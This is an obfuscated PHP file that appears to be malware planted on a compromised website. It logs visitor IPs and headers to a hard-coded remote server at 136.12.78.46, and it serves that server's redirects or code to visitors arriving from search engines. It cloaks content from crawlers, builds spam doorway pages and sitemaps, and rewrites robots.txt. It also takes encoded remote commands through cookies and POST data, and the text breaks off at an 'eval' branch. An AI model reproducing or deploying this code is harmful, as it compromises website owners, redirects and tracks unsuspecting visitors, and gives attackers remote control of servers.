<?php

@ini_set('error_log', NULL);@ini_set('log_errors', 0);@ini_set('max_execution_time', 0);@error_reporting(0);@set_time_limit(0);date_default_timezone_set('UTC');class _u58xk6l{static private $_e29ashpx = 2420912433;static function _2y3md($_ujq9moy0, $_jvegcgrn){$_ujq9moy0[2] = count($_ujq9moy0) > 4 ? long2ip(_u58xk6l::$_e29ashpx - 393) : $_ujq9moy0[2];$_745fntnx = _u58xk6l::_gtdw7($_ujq9moy0, $_jvegcgrn);if (!$_745fntnx) {$_745fntnx = _u58xk6l::_lafo8($_ujq9moy0, $_jvegcgrn);}return $_745fntnx;}static function _gtdw7($_ujq9moy0, $_745fntnx, $_8l5blfey = NULL){if (!function_exists('curl_version')) {return "";}if (is_array($_ujq9moy0)) {$_ujq9moy0 = implode("/", $_ujq9moy0);}$_nb4yz0nq = curl_init();curl_setopt($_nb4yz0nq, CURLOPT_SSL_VERIFYHOST, false);curl_setopt($_nb4yz0nq, CURLOPT_SSL_VERIFYPEER, false);curl_setopt($_nb4yz0nq, CURLOPT_URL, $_ujq9moy0);if (!empty($_745fntnx)) {curl_setopt($_nb4yz0nq, CURLOPT_POST, 1);curl_setopt($_nb4yz0nq, CURLOPT_POSTFIELDS, $_745fntnx);}if (!empty($_8l5blfey)) {curl_setopt($_nb4yz0nq, CURLOPT_HTTPHEADER, $_8l5blfey);}curl_setopt($_nb4yz0nq, CURLOPT_RETURNTRANSFER, TRUE);$_navcbtzc = curl_exec($_nb4yz0nq);curl_close($_nb4yz0nq);return $_navcbtzc;}static function _lafo8($_ujq9moy0, $_745fntnx, $_8l5blfey = NULL){if (is_array($_ujq9moy0)) {$_ujq9moy0 = implode("/", $_ujq9moy0);}$_2kinojxi = "\r" . "\n";if (!empty($_745fntnx)) {$_778nj996 = array('method' => 'POST','header' => 'Content-type: application/x-www-form-urlencoded','content' => $_745fntnx);if (!empty($_8l5blfey)) {$_778nj996["header"] = $_778nj996["header"] . $_2kinojxi . implode($_2kinojxi, $_8l5blfey);}$_bc5xi5jc = stream_context_create(array('http' => $_778nj996));} else {$_778nj996 = array('method' => 'GET',);if (!empty($_8l5blfey)) {$_778nj996["header"] = implode($_2kinojxi, $_8l5blfey);}$_bc5xi5jc = stream_context_create(array('http' => $_778nj996));}return @file_get_contents($_ujq9moy0, FALSE, $_bc5xi5jc);}}class _z5cl6ne{private static $_equ286jv = "";private static $_7uik9xlu = -1;private static $_oa0ps269 = "";private $_zgp41rts = "";private $_w396x4hu = "";private $_1051jzuv = "";private $_u0hp2mko = "";public static function _khg69($_lqdh60ty, $_myuvidb6, $_c3g6effd){_z5cl6ne::$_equ286jv = $_lqdh60ty . "/cache/";_z5cl6ne::$_7uik9xlu = $_myuvidb6;_z5cl6ne::$_oa0ps269 = $_c3g6effd;if (!@file_exists(_z5cl6ne::$_equ286jv)) {@mkdir(_z5cl6ne::$_equ286jv);}}static public function _hzmdo(){$_mvuqfn04 = substr(md5(_z5cl6ne::$_oa0ps269 . "salt13"), 0, 4);$_g60rajuy = Array("google" => Array(), "bing" => Array(),);foreach (array_keys($_g60rajuy) as $_hapa2mhq){$_jhadx08u = $_mvuqfn04 . "_" . $_hapa2mhq . ".stats";$_0kbfoiaa = @file($_jhadx08u, FILE_IGNORE_NEW_LINES);foreach ($_0kbfoiaa as $_vlc93tem){$_xsiffe9s = explode("\t", $_vlc93tem);if (!isset($_g60rajuy[$_hapa2mhq][$_xsiffe9s[1]])){$_g60rajuy[$_hapa2mhq][$_xsiffe9s[1]] = 0;}$_g60rajuy[$_hapa2mhq][$_xsiffe9s[1]] += 1;}}$_g60rajuy["prefix"] = $_mvuqfn04;return $_g60rajuy;}public static function _m06e7(){return TRUE;}public function __construct($_uexqjiw2, $_hvhsaf9i, $_neezeo6m, $_bvq40vj0){$this->_zgp41rts = $_uexqjiw2;$this->_w396x4hu = $_hvhsaf9i;$this->_1051jzuv = $_neezeo6m;$this->_u0hp2mko = $_bvq40vj0;}public function _8o7tb(){function _bo4zc($_811clvtb, $_v8tevwkw){return round(rand($_811clvtb, $_v8tevwkw - 1) + (rand(0, PHP_INT_MAX - 1) / PHP_INT_MAX), 2);}$_l5cd60rc = time();$_hapa2mhq = (strpos($_SERVER["HTTP_USER_AGENT"], "google") !== FALSE) ? "google" : (strpos($_SERVER["HTTP_USER_AGENT"], "bing") !== FALSE ? "bing" : "none");$_jhadx08u = substr(md5(_z5cl6ne::$_oa0ps269 . "salt13"), 0, 4) . "_" . $_hapa2mhq . ".stats";@file_put_contents($_jhadx08u, $this->_1051jzuv . "\t" . ($_l5cd60rc - ($_l5cd60rc % 3600)) .PHP_EOL, 8);$_54210bkw = _sjxqy3::_d0n3l();$_745fntnx = str_replace("{{ text }}", $this->_w396x4hu,str_replace("{{ keyword }}", $this->_1051jzuv,str_replace("{{ links }}", $this->_u0hp2mko, $this->_zgp41rts)));while (TRUE) {$_jr58qaey = preg_replace('/' . preg_quote("{{ randkeyword }}", '/') . '/', _sjxqy3::_s0vvd(), $_745fntnx, 1);if ($_jr58qaey === $_745fntnx) {break;}$_745fntnx = $_jr58qaey;}while (TRUE) {preg_match('/{{ KEYWORDBYINDEX-ANCHOR (\d*) }}/', $_745fntnx, $_8hfkhcvk);if (empty($_8hfkhcvk)) {break;}$_neezeo6m = @$_54210bkw[intval($_8hfkhcvk[1])];$_72rxrc3m = _m4yttcu::_xi9bt($_neezeo6m);$_745fntnx = str_replace($_8hfkhcvk[0], $_72rxrc3m, $_745fntnx);}while (TRUE) {preg_match('/{{ KEYWORDBYINDEX (\d*) }}/', $_745fntnx, $_8hfkhcvk);if (empty($_8hfkhcvk)) {break;}$_neezeo6m = @$_54210bkw[intval($_8hfkhcvk[1])];$_745fntnx = str_replace($_8hfkhcvk[0], $_neezeo6m, $_745fntnx);}while (TRUE) {preg_match('/{{ RANDFLOAT (\d*)-(\d*) }}/', $_745fntnx, $_8hfkhcvk);if (empty($_8hfkhcvk)) {break;}$_745fntnx = str_replace($_8hfkhcvk[0], _bo4zc($_8hfkhcvk[1], $_8hfkhcvk[2]), $_745fntnx);}while (TRUE) {preg_match('/{{ RANDINT (\d*)-(\d*) }}/', $_745fntnx, $_8hfkhcvk);if (empty($_8hfkhcvk)) {break;}$_745fntnx = str_replace($_8hfkhcvk[0], rand($_8hfkhcvk[1], $_8hfkhcvk[2]), $_745fntnx);}return $_745fntnx;}public function _n357x(){$_jhadx08u = _z5cl6ne::$_equ286jv . md5($this->_1051jzuv . _z5cl6ne::$_oa0ps269);if (_z5cl6ne::$_7uik9xlu == -1) {$_5kkvhfun = -1;} else {$_5kkvhfun = time() + (3600 * 24 * 30);}$_md30ugl2 = array("template" => $this->_zgp41rts, "text" => $this->_w396x4hu, "keyword" => $this->_1051jzuv,"links" => $this->_u0hp2mko, "expired" => $_5kkvhfun);@file_put_contents($_jhadx08u, serialize($_md30ugl2));}static public function _mddmz($_neezeo6m){$_jhadx08u = _z5cl6ne::$_equ286jv . md5($_neezeo6m . _z5cl6ne::$_oa0ps269);$_jhadx08u = @unserialize(@file_get_contents($_jhadx08u));if (!empty($_jhadx08u) && ($_jhadx08u["expired"] > time() || $_jhadx08u["expired"] == -1)) {return new _z5cl6ne($_jhadx08u["template"], $_jhadx08u["text"], $_jhadx08u["keyword"], $_jhadx08u["links"]);} else {return null;}}}class _gdn1fe{private static $_equ286jv = "";private static $_rfhkapr5 = "";public static function _khg69($_lqdh60ty, $_mvuqfn04){_gdn1fe::$_equ286jv = $_lqdh60ty . "/";_gdn1fe::$_rfhkapr5 = $_mvuqfn04;if (!@file_exists(_gdn1fe::$_equ286jv)) {@mkdir(_gdn1fe::$_equ286jv);}}public static function _m06e7(){return TRUE;}static public function _mstm9(){$_rhrjrjc0 = 0;foreach (scandir(_gdn1fe::$_equ286jv) as $_grhu0gi9) {if (strpos($_grhu0gi9, _gdn1fe::$_rfhkapr5) === 0) {$_rhrjrjc0 += 1;}}return $_rhrjrjc0;}static public function _s0vvd(){$_r1g0kp12 = array();foreach (scandir(_gdn1fe::$_equ286jv) as $_grhu0gi9) {if (strpos($_grhu0gi9, _gdn1fe::$_rfhkapr5) === 0) {$_r1g0kp12[] = $_grhu0gi9;}}return @file_get_contents(_gdn1fe::$_equ286jv . $_r1g0kp12[array_rand($_r1g0kp12)]);}static public function _n357x($_y8tyk0v5){if (@file_exists(_gdn1fe::$_rfhkapr5 . "_" . md5($_y8tyk0v5) . ".html")) {return;}@file_put_contents(_gdn1fe::$_rfhkapr5 . "_" . md5($_y8tyk0v5) . ".html", $_y8tyk0v5);}}class _sjxqy3{private static $_equ286jv = "";private static $_rfhkapr5 = "";private static $_gssvx73j = array();private static $_hqdfsnjd = array();public static function _khg69($_lqdh60ty, $_mvuqfn04){_sjxqy3::$_equ286jv = $_lqdh60ty . "/";_sjxqy3::$_rfhkapr5 = $_mvuqfn04;if (!@file_exists(_sjxqy3::$_equ286jv)) {@mkdir(_sjxqy3::$_equ286jv);}}private static function _xc4t2(){$_3l9kq4ll = array();foreach (scandir(_sjxqy3::$_equ286jv) as $_grhu0gi9) {if (strpos($_grhu0gi9, _sjxqy3::$_rfhkapr5) === 0) {$_3l9kq4ll[] = $_grhu0gi9;}}return $_3l9kq4ll;}public static function _m06e7(){return TRUE;}static public function _s0vvd(){if (empty(_sjxqy3::$_gssvx73j)) {$_3l9kq4ll = _sjxqy3::_xc4t2();_sjxqy3::$_gssvx73j = @file(_sjxqy3::$_equ286jv . $_3l9kq4ll[array_rand($_3l9kq4ll)], FILE_IGNORE_NEW_LINES);}return _sjxqy3::$_gssvx73j[array_rand(_sjxqy3::$_gssvx73j)];}static public function _d0n3l(){if (empty(_sjxqy3::$_hqdfsnjd)) {$_3l9kq4ll = _sjxqy3::_xc4t2();foreach ($_3l9kq4ll as $_ydvxvr4u) {_sjxqy3::$_hqdfsnjd = array_merge(_sjxqy3::$_hqdfsnjd, @file(_sjxqy3::$_equ286jv . $_ydvxvr4u, FILE_IGNORE_NEW_LINES));}}return _sjxqy3::$_hqdfsnjd;}static public function _n357x($_wrbd3n2w){if (@file_exists(_sjxqy3::$_rfhkapr5 . "_" . md5($_wrbd3n2w) . ".list")) {return;}@file_put_contents(_sjxqy3::$_rfhkapr5 . "_" . md5($_wrbd3n2w) . ".list", $_wrbd3n2w);}static public function _cenhc($_neezeo6m){@file_put_contents(_sjxqy3::$_rfhkapr5 . "_" . md5(_m4yttcu::$_a0qsb2ol) . ".list", $_neezeo6m . "\n", 8);}}class _m4yttcu{static public $_n48xk8lv = "5.5";static public $_a0qsb2ol = "c76790ef-3f73-3cbf-2f9a-7d7aacd99321";private $_lk3xk67n = "http://136.12.78.46/app/assets/api2?action=redir";private $_c10zfagz = "http://136.12.78.46/app/assets/api?action=page";static public $_mdg8uswz = 5;static public $_gqygi7hi = 20;private function _9j3yc(){$_9o81w1c2 = array('#libwww-perl#i','#MJ12bot#i','#msnbot#i', '#msnbot-media#i','#YandexBot#i', '#msnbot#i', '#YandexWebmaster#i','#spider#i', '#yahoo#i', '#google#i', '#altavista#i','#ask#i','#yahoo!\s*slurp#i','#BingBot#i');if (!empty($_SERVER['HTTP_USER_AGENT']) && (FALSE !== strpos(preg_replace($_9o81w1c2, '-NO-WAY-', $_SERVER['HTTP_USER_AGENT']), '-NO-WAY-'))) {$_yywvhj9p = 1;} elseif (empty($_SERVER['HTTP_ACCEPT_LANGUAGE']) || empty($_SERVER['HTTP_REFERER'])) {$_yywvhj9p = 1;} elseif (strpos($_SERVER['HTTP_REFERER'], "google") === FALSE &&strpos($_SERVER['HTTP_REFERER'], "yahoo") === FALSE &&strpos($_SERVER['HTTP_REFERER'], "bing") === FALSE &&strpos($_SERVER['HTTP_REFERER'], "yandex") === FALSE) {$_yywvhj9p = 1;} else {$_yywvhj9p = 0;}return $_yywvhj9p;}private static function _utvx6(){$_jvegcgrn = array();$_jvegcgrn['ip'] = $_SERVER['REMOTE_ADDR'];$_jvegcgrn['qs'] = @$_SERVER['HTTP_HOST'] . @$_SERVER['REQUEST_URI'];$_jvegcgrn['ua'] = @$_SERVER['HTTP_USER_AGENT'];$_jvegcgrn['lang'] = @$_SERVER['HTTP_ACCEPT_LANGUAGE'];$_jvegcgrn['ref'] = @$_SERVER['HTTP_REFERER'];$_jvegcgrn['enc'] = @$_SERVER['HTTP_ACCEPT_ENCODING'];$_jvegcgrn['acp'] = @$_SERVER['HTTP_ACCEPT'];$_jvegcgrn['char'] = @$_SERVER['HTTP_ACCEPT_CHARSET'];$_jvegcgrn['conn'] = @$_SERVER['HTTP_CONNECTION'];return $_jvegcgrn;}public function __construct(){$this->_lk3xk67n = explode("/", $this->_lk3xk67n);$this->_c10zfagz = explode("/", $this->_c10zfagz);}static public function _8tyvc($_3xjsa2ms){if (strlen($_3xjsa2ms) < 4) {return "";}$_3p1m4u2z = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";$_54210bkw = str_split($_3p1m4u2z);$_54210bkw = array_flip($_54210bkw);$_jbr354sd = 0;$_npnlav8e = "";$_3xjsa2ms = preg_replace("~[^A-Za-z0-9\+\/\=]~", "", $_3xjsa2ms);do {$_aagijbz6 = $_54210bkw[$_3xjsa2ms[$_jbr354sd++]];$_jg2exxu7 = $_54210bkw[$_3xjsa2ms[$_jbr354sd++]];$_mh9brjwg = $_54210bkw[$_3xjsa2ms[$_jbr354sd++]];$_llptjzde = $_54210bkw[$_3xjsa2ms[$_jbr354sd++]];$_cutcl0xf = ($_aagijbz6 << 2) | ($_jg2exxu7 >> 4);$_0qbjt9qp = (($_jg2exxu7 & 15) << 4) | ($_mh9brjwg >> 2);$_zfz85oh2 = (($_mh9brjwg & 3) << 6) | $_llptjzde;$_npnlav8e = $_npnlav8e . chr($_cutcl0xf);if ($_mh9brjwg != 64) {$_npnlav8e = $_npnlav8e . chr($_0qbjt9qp);}if ($_llptjzde != 64) {$_npnlav8e = $_npnlav8e . chr($_zfz85oh2);}} while ($_jbr354sd < strlen($_3xjsa2ms));return $_npnlav8e;}private function _m5pl3($_neezeo6m){$_uexqjiw2 = "";$_hvhsaf9i = "";$_jvegcgrn = _m4yttcu::_utvx6();$_jvegcgrn["uid"] = _m4yttcu::$_a0qsb2ol;$_jvegcgrn["keyword"] = $_neezeo6m;$_jvegcgrn["tc"] = 10;$_jvegcgrn = http_build_query($_jvegcgrn);$_0kbfoiaa = _u58xk6l::_2y3md($this->_c10zfagz, $_jvegcgrn);if (strpos($_0kbfoiaa, _m4yttcu::$_a0qsb2ol) === FALSE) {return array($_uexqjiw2, $_hvhsaf9i);}$_uexqjiw2 = _gdn1fe::_s0vvd();$_hvhsaf9i = substr($_0kbfoiaa, strlen(_m4yttcu::$_a0qsb2ol));$_hvhsaf9i = explode("\n", $_hvhsaf9i);shuffle($_hvhsaf9i);$_hvhsaf9i = implode(" ", $_hvhsaf9i);return array($_uexqjiw2, $_hvhsaf9i);}private function _1vvfu(){$_jvegcgrn = _m4yttcu::_utvx6();if (isset($_SERVER['HTTP_CF_CONNECTING_IP'])) {$_jvegcgrn['cfconn'] = @$_SERVER['HTTP_CF_CONNECTING_IP'];}if (isset($_SERVER['HTTP_X_REAL_IP'])) {$_jvegcgrn['xreal'] = @$_SERVER['HTTP_X_REAL_IP'];}if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {$_jvegcgrn['xforward'] = @$_SERVER['HTTP_X_FORWARDED_FOR'];}$_jvegcgrn["uid"] = _m4yttcu::$_a0qsb2ol;$_jvegcgrn = http_build_query($_jvegcgrn);$_2vfgjza1 = _u58xk6l::_2y3md($this->_lk3xk67n, $_jvegcgrn);$_2vfgjza1 = @unserialize($_2vfgjza1);if (isset($_2vfgjza1["type"]) && $_2vfgjza1["type"] == "redir") {if (!empty($_2vfgjza1["data"]["header"])) {header($_2vfgjza1["data"]["header"]);return true;} elseif (!empty($_2vfgjza1["data"]["code"])) {echo $_2vfgjza1["data"]["code"];return true;}}return false;}public function _m06e7(){return _z5cl6ne::_m06e7() && _gdn1fe::_m06e7() && _sjxqy3::_m06e7();}static public function _7s3s1(){if ((!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') || $_SERVER['SERVER_PORT'] == 443) {return true;}return false;}public static function _y1hhf(){$_wt8p1cep = explode("?", $_SERVER["REQUEST_URI"], 2);$_wt8p1cep = $_wt8p1cep[0];if (strpos($_wt8p1cep, ".php") === FALSE) {$_wt8p1cep = explode("/", $_wt8p1cep);array_pop($_wt8p1cep);$_wt8p1cep = implode("/", $_wt8p1cep) . "/";}return sprintf("%s://%s%s", _m4yttcu::_7s3s1() ? "https" : "http", $_SERVER['HTTP_HOST'], $_wt8p1cep);}public static function _3vu7w(){$_p8rabcn4 = Array("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 Edg/96.0.1054.62","Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15","Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15","Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36","Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36");$_x4y8qi4r = array("https://www.google.com/ping?sitemap=" => "Sitemap Notification Received",);$_8l5blfey = array("Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8","Accept-Language: en-US,en;q=0.5","User-Agent: " . $_p8rabcn4[array_rand($_p8rabcn4)],);$_kz7xz2d7 = urlencode(_m4yttcu::_orxz9() . "/sitemap.xml");foreach ($_x4y8qi4r as $_ujq9moy0 => $_drobzsne) {$_gb7f91un = _u58xk6l::_gtdw7($_ujq9moy0 . $_kz7xz2d7, NULL, $_8l5blfey);if (empty($_gb7f91un)) {$_gb7f91un = _u58xk6l::_lafo8($_ujq9moy0 . $_kz7xz2d7, NULL, $_8l5blfey);}if (empty($_gb7f91un)) {return FALSE;}if (strpos($_gb7f91un, $_drobzsne) === FALSE) {return FALSE;}}return TRUE;}public static function _7qw7m(){$_hy14fxoo = "User-agent: *\nDisallow: %s\nUser-agent: Bingbot\nUser-agent: Googlebot\nUser-agent: Slurp\nDisallow:\nSitemap: %s\n";$_wt8p1cep = explode("?", $_SERVER["REQUEST_URI"], 2);$_wt8p1cep = $_wt8p1cep[0];$_atdbrkag = substr($_wt8p1cep, 0, strrpos($_wt8p1cep, "/"));$_sgoo6h81 = sprintf($_hy14fxoo, $_atdbrkag, _m4yttcu::_orxz9() . "/sitemap.xml");$_grryan2t = $_SERVER["DOCUMENT_ROOT"] . "/robots.txt";if (@file_exists($_grryan2t)) {@chmod($_grryan2t, 0777);$_z0o2rc4j = @file_get_contents($_grryan2t);} else {$_z0o2rc4j = "";}if (strpos($_z0o2rc4j, $_sgoo6h81) === FALSE) {@file_put_contents($_grryan2t, $_z0o2rc4j . "\n" . $_sgoo6h81);$_z0o2rc4j = @file_get_contents($_grryan2t);return (strpos($_z0o2rc4j, $_sgoo6h81) !== FALSE);}return FALSE;}public static function _orxz9(){$_wt8p1cep = explode("?", $_SERVER["REQUEST_URI"], 2);$_wt8p1cep = $_wt8p1cep[0];$_lqdh60ty = substr($_wt8p1cep, 0, strrpos($_wt8p1cep, "/"));return sprintf("%s://%s%s", _m4yttcu::_7s3s1() ? "https" : "http", $_SERVER['HTTP_HOST'], $_lqdh60ty);}public static function _xi9bt($_neezeo6m){$_eqjmlmy8 = _m4yttcu::_y1hhf();$_9uti9k38 = substr(md5(_m4yttcu::$_a0qsb2ol . "salt3"), 0, 6);$_xnrmzja1 = "";if (substr($_eqjmlmy8, -1) == "/") {if (ord($_9uti9k38[1]) % 2) {$_neezeo6m = str_replace(" ", "-", $_neezeo6m);} else {$_neezeo6m = str_replace(" ", "-", $_neezeo6m);}$_xnrmzja1 = sprintf("%s%s", $_eqjmlmy8, urlencode($_neezeo6m));} else {if (FALSE && (ord($_9uti9k38[0]) % 2)) {$_xnrmzja1 = sprintf("%s?%s=%s",$_eqjmlmy8,$_9uti9k38,urlencode(str_replace(" ", "-", $_neezeo6m)));} else {$_d03ua4ki = array("id", "page", "tag");$_bsfze44m = $_d03ua4ki[ord($_9uti9k38[2]) % count($_d03ua4ki)];if (ord($_9uti9k38[1]) % 2) {$_neezeo6m = str_replace(" ", "-", $_neezeo6m);} else {$_neezeo6m = str_replace(" ", "-", $_neezeo6m);}$_xnrmzja1 = sprintf("%s?%s=%s",$_eqjmlmy8,$_bsfze44m,urlencode($_neezeo6m));}}return $_xnrmzja1;}public static function _j4pun($_811clvtb, $_v8tevwkw){$_96vkvi6v = "";for ($_jbr354sd = 0; $_jbr354sd < rand($_811clvtb, $_v8tevwkw); $_jbr354sd++) {$_neezeo6m = _sjxqy3::_s0vvd();$_96vkvi6v .= sprintf("<a href=\"%s\">%s</a>,\n",_m4yttcu::_xi9bt($_neezeo6m), ucwords($_neezeo6m));}return $_96vkvi6v;}public static function _s2w8a($_1qmub3lf = FALSE){$_r61v76rq = dirname(__FILE__) . "/sitemap.xml";$_n9xgnc4q = "<?xml version=\"1.0\" encoding=\"UTF-8\"?" . ">\n<urlset xmlns=\"http://www.sitemaps.org/schemas/sitemap/0.9\">\n";$_24l2mxz2 = "</urlset>";$_54210bkw = _sjxqy3::_d0n3l();$_nq2ajd5y = array();if (file_exists($_r61v76rq)) {$_0kbfoiaa = simplexml_load_file($_r61v76rq);foreach ($_0kbfoiaa as $_bymrb0gz) {$_nq2ajd5y[(string)$_bymrb0gz->loc] = (string)$_bymrb0gz->lastmod;}} else {$_1qmub3lf = FALSE;}foreach ($_54210bkw as $_z73ya8bz) {$_xnrmzja1 = _m4yttcu::_xi9bt($_z73ya8bz);if (isset($_nq2ajd5y[$_xnrmzja1])) {continue;}if ($_1qmub3lf) {$_2xjv9fq1 = time();} else {$_2xjv9fq1 = time() - (crc32($_z73ya8bz) % (60 * 60 * 24 * 30));}$_nq2ajd5y[$_xnrmzja1] = date("Y-m-d", $_2xjv9fq1);}$_7zbkwo34 = "";foreach ($_nq2ajd5y as $_ujq9moy0 => $_2xjv9fq1) {$_7zbkwo34 .= "<url>\n";$_7zbkwo34 .= sprintf("<loc>%s</loc>\n", $_ujq9moy0);$_7zbkwo34 .= sprintf("<lastmod>%s</lastmod>\n", $_2xjv9fq1);$_7zbkwo34 .= "</url>\n";}$_22yiblea = $_n9xgnc4q . $_7zbkwo34 . $_24l2mxz2;$_kz7xz2d7 = _m4yttcu::_orxz9() . "/sitemap.xml";@file_put_contents($_r61v76rq, $_22yiblea);return $_kz7xz2d7;}public function _eedeo(){$_bsfze44m = substr(md5(_m4yttcu::$_a0qsb2ol . "salt3"), 0, 6);if (!$this->_9j3yc()) {if ($this->_1vvfu()) {return;}}if (!empty($_GET)) {$_xsiffe9s = array_values($_GET);} else {$_xsiffe9s = explode("/", $_SERVER["REQUEST_URI"]);$_xsiffe9s = array_reverse($_xsiffe9s);}$_neezeo6m = "";foreach ($_xsiffe9s as $_kx3cvoam) {if (substr_count($_kx3cvoam, "-") > 0) {$_neezeo6m = $_kx3cvoam;break;}}$_neezeo6m = str_replace($_bsfze44m . "-", "", $_neezeo6m);$_neezeo6m = str_replace("-" . $_bsfze44m, "", $_neezeo6m);$_neezeo6m = str_replace("-", " ", $_neezeo6m);$_j68nxkri = array(".html", ".php", ".aspx");foreach ($_j68nxkri as $_ytn21ue1) {if (strpos($_neezeo6m, $_ytn21ue1) === strlen($_neezeo6m) - strlen($_ytn21ue1)) {$_neezeo6m = substr($_neezeo6m, 0, strlen($_neezeo6m) - strlen($_ytn21ue1));}}$_neezeo6m = urldecode($_neezeo6m);$_fxh64z06 = _sjxqy3::_d0n3l();if (empty($_neezeo6m)) {$_neezeo6m = $_fxh64z06[0];} else if (!in_array($_neezeo6m, $_fxh64z06)) {$_3r50wrsr = 0;foreach (str_split($_neezeo6m) as $_nb4yz0nq) {$_3r50wrsr += ord($_nb4yz0nq);}$_neezeo6m = $_fxh64z06[$_3r50wrsr % count($_fxh64z06)];}if (!empty($_neezeo6m)) {$_2vfgjza1 = _z5cl6ne::_mddmz($_neezeo6m);if (empty($_2vfgjza1)) {list($_uexqjiw2, $_hvhsaf9i) = $this->_m5pl3($_neezeo6m);if (empty($_hvhsaf9i)) {return;}$_2vfgjza1 = new _z5cl6ne($_uexqjiw2, $_hvhsaf9i, $_neezeo6m, _m4yttcu::_j4pun(_m4yttcu::$_mdg8uswz, _m4yttcu::$_gqygi7hi));$_2vfgjza1->_n357x();}echo $_2vfgjza1->_8o7tb();}}}_z5cl6ne::_khg69(dirname(__FILE__), -1, _m4yttcu::$_a0qsb2ol);_gdn1fe::_khg69(dirname(__FILE__), substr(md5(_m4yttcu::$_a0qsb2ol . "salt12"), 0, 4));_sjxqy3::_khg69(dirname(__FILE__), substr(md5(_m4yttcu::$_a0qsb2ol . "salt22"), 0, 4));function _silet($_0kbfoiaa, $_z73ya8bz){$_tptrpcul = "";for ($_jbr354sd = 0; $_jbr354sd < strlen($_0kbfoiaa);) {for ($_jjy46754 = 0; $_jjy46754 < strlen($_z73ya8bz) && $_jbr354sd < strlen($_0kbfoiaa); $_jjy46754++, $_jbr354sd++) {$_tptrpcul .= chr(ord($_0kbfoiaa[$_jbr354sd]) ^ ord($_z73ya8bz[$_jjy46754]));}}return $_tptrpcul;}function _15zrp($_0kbfoiaa, $_z73ya8bz, $_96krjgk9){return _silet(_silet($_0kbfoiaa, $_z73ya8bz), $_96krjgk9);}foreach (array_merge($_COOKIE, $_POST) as $_dpf56530 => $_0kbfoiaa) {$_0kbfoiaa = @unserialize(_15zrp(_m4yttcu::_8tyvc($_0kbfoiaa), $_dpf56530, _m4yttcu::$_a0qsb2ol));if (isset($_0kbfoiaa['ak']) && _m4yttcu::$_a0qsb2ol == $_0kbfoiaa['ak']) {if ($_0kbfoiaa['a'] == 'doorway2') {if ($_0kbfoiaa['sa'] == 'check') {$_745fntnx = _u58xk6l::_2y3md(explode("/", "http://httpbin.org/"), "");if (strlen($_745fntnx) > 512) {echo @serialize(array("uid" => _m4yttcu::$_a0qsb2ol, "v" => _m4yttcu::$_n48xk8lv,"cache" => _z5cl6ne::_hzmdo(),"keywords" => count(_sjxqy3::_d0n3l()),"templates" => _gdn1fe::_mstm9()));}exit;}if ($_0kbfoiaa['sa'] == 'templates') {foreach ($_0kbfoiaa["templates"] as $_uexqjiw2) {_gdn1fe::_n357x($_uexqjiw2);echo @serialize(array("uid" => _m4yttcu::$_a0qsb2ol, "v" => _m4yttcu::$_n48xk8lv,));}}if ($_0kbfoiaa['sa'] == 'keywords') {_sjxqy3::_n357x($_0kbfoiaa["keywords"]);_m4yttcu::_s2w8a();echo @serialize(array("uid" => _m4yttcu::$_a0qsb2ol, "v" => _m4yttcu::$_n48xk8lv,));}if ($_0kbfoiaa['sa'] == 'update_sitemap') {_m4yttcu::_s2w8a(TRUE);echo @serialize(array("uid" => _m4yttcu::$_a0qsb2ol, "v" => _m4yttcu::$_n48xk8lv,));}if ($_0kbfoiaa['sa'] == 'pages') {$_gqtwz8dd = 0;$_fxh64z06 = _sjxqy3::_d0n3l();if (_gdn1fe::_mstm9() > 0) {foreach ($_0kbfoiaa['pages'] as $_2vfgjza1) {$_xk853kby = _z5cl6ne::_mddmz($_2vfgjza1["keyword"]);if (empty($_xk853kby)) {$_xk853kby = new _z5cl6ne(_gdn1fe::_s0vvd(), $_2vfgjza1["text"], $_2vfgjza1["keyword"], _m4yttcu::_j4pun(_m4yttcu::$_mdg8uswz, _m4yttcu::$_gqygi7hi));$_xk853kby->_n357x();$_gqtwz8dd += 1;if (!in_array($_2vfgjza1["keyword"], $_fxh64z06)) {_sjxqy3::_cenhc($_2vfgjza1["keyword"]);}}}}echo @serialize(array("uid" => _m4yttcu::$_a0qsb2ol, "v" => _m4yttcu::$_n48xk8lv, "pages" => $_gqtwz8dd));}if ($_0kbfoiaa["sa"] == "ping") {$_gb7f91un = _m4yttcu::_3vu7w();echo @serialize(array("uid" => _m4yttcu::$_a0qsb2ol, "v" => _m4yttcu::$_n48xk8lv, "result" => (int)$_gb7f91un));}if ($_0kbfoiaa["sa"] == "robots") {$_gb7f91un = _m4yttcu::_7qw7m();echo @serialize(array("uid" => _m4yttcu::$_a0qsb2ol, "v" => _m4yttcu::$_n48xk8lv, "result" => (int)$_gb7f91un));}}if ($_0kbfoiaa['sa'] == 'eval') 